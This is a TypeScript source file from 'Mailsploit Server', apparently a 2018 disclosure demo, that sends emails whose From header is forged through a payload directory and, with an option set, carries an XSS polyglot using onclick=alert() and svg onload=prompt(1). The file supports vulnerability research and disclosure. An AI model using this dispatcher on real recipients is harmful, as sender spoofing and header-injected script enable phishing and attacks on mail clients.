/*
 * Mailsploit Server
 * Copyright (C) 2018 Sabri Haddouche
 */

import * as util from 'util';
import * as escape from 'escape-html';
import * as nodeMailer from 'nodemailer';
import * as SMTPTransport from 'nodemailer/lib/smtp-transport';
import {PayloadDirectory, PayloadDirectoryCount} from './Payloads';
import {Config} from './Config';

const username = process.env.MAILSPLOIT_USERNAME;
const password = process.env.MAILSPLOIT_PASSWORD;
const host = process.env.MAILSPLOIT_HOST || 'email-smtp.eu-west-1.amazonaws.com';
const port = Number(process.env.MAILSPLOIT_PORT || 465);
const ignoreTls = process.env.MAILSPLOIT_IGNORE_TLS;

export class Dispatcher {
  private transporter;

  private static isEmail(email: string) {
    return /^([^\x00-\x20\x22\x28\x29\x2c\x2e\x3a-\x3c\x3e\x40\x5b-\x5d\x7f-\xff]+|\x22([^\x0d\x22\x5c\x80-\xff]|\x5c[\x00-\x7f])*\x22)(\x2e([^\x00-\x20\x22\x28\x29\x2c\x2e\x3a-\x3c\x3e\x40\x5b-\x5d\x7f-\xff]+|\x22([^\x0d\x22\x5c\x80-\xff]|\x5c[\x00-\x7f])*\x22))*\x40([^\x00-\x20\x22\x28\x29\x2c\x2e\x3a-\x3c\x3e\x40\x5b-\x5d\x7f-\xff]+|\x5b([^\x0d\x5b-\x5d\x80-\xff]|\x5c[\x00-\x7f])*\x5d)(\x2e([^\x00-\x20\x22\x28\x29\x2c\x2e\x3a-\x3c\x3e\x40\x5b-\x5d\x7f-\xff]+|\x5b([^\x0d\x5b-\x5d\x80-\xff]|\x5c[\x00-\x7f])*\x5d))*$/.test(
      email,
    );
  }

  constructor() {
    this.transporter = nodeMailer.createTransport({
      host,
      port,
      tls: { rejectUnauthorized: !ignoreTls },
      secure: !(port === 25 || port === 587),
      auth: {
        user: username,
        pass: password,
      },
      // Pool
      pool: true,
      rateLimit: 14,
    });
  }

  private _internalDispatcher(options: nodeMailer.SendMailOptions): void {
    console.log('Dispatching email...');
    this.transporter.sendMail(options, (error, info) => {
      if (error) {
        return console.log(JSON.stringify(error));
      }
      //console.log('Email has been dispatched');
      //return console.log(JSON.stringify(info));
    });
  }

  private _dispatch(receiver: string, sender: string, options: Array<number>, ci: boolean) {
    for (const option of options) {
      // Polyglot asked?
      if (ci && PayloadDirectory[option].generic !== true) {
        const payload = PayloadDirectory[option].build(
          `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=prompt(1)//>\\x3e`,
        );
        //console.log(payload.length);
        if (payload.length <= 320) {
          this._internalDispatcher({
            from: payload,
            html: Config.Dispatcher.htmlBodyXSS,
            subject: `Mailsploit: ${PayloadDirectory[option].name}${
              typeof PayloadDirectory[option].representation === 'string'
                ? ` (XSS polyglot via ${PayloadDirectory[option].representation})`
                : ' (XSS polyglot)'
            }`,
            text: Config.Dispatcher.plaintextBodyXSS,
            to: receiver,
          });
        } else {
          //console.log(`Did not sent XSS for option ${option} because the payload is more than 320 bytes.`);
        }
      }

      const escapedSender = escape(sender);

      this._internalDispatcher({
        from: PayloadDirectory[option].build(sender),
        replyTo: sender,
        html: util.format(
          !PayloadDirectory[option].generic ? Config.Dispatcher.htmlBody : Config.Dispatcher.htmlBodyGeneric,
          escapedSender,
        ),
        subject: `Mailsploit: ${PayloadDirectory[option].name}${
          typeof PayloadDirectory[option].representation === 'string' && !PayloadDirectory[option].generic
            ? ` (via ${PayloadDirectory[option].representation})`
            : ''
        }`,
        text: util.format(
          !PayloadDirectory[option].generic ? Config.Dispatcher.plaintextBody : Config.Dispatcher.plaintextBodyGeneric,
          escapedSender,
        ),
        to: receiver,
      });
    }
  }

  public async dispatch(receiver: string, sender: string, option: number, ci: string): Promise<void> {
    console.log(`Dispatching a demo to %s as %s with option %o`, receiver, sender, option);

    // Check email
    if (!Dispatcher.isEmail(receiver) || !Dispatcher.isEmail(sender)) {
      throw new Error('Provided email is invalid.');
    }

    // Check number
    if (typeof option !== 'string' || (typeof PayloadDirectory[parseInt(option)] === 'undefined' && option !== '-1')) {
      throw new Error('Non-existant payload detected.');
    }

    const wantCI = typeof ci === 'string' && ci === 'true' ? true : false;

    if (option === '-1') {
      this._dispatch(
        receiver,
        sender,
        Array.apply(null, {length: PayloadDirectoryCount}).map(Number.call, Number),
        wantCI,
      );
    } else {
      this._dispatch(receiver, sender, [parseInt(option)], wantCI);
    }
  }
}
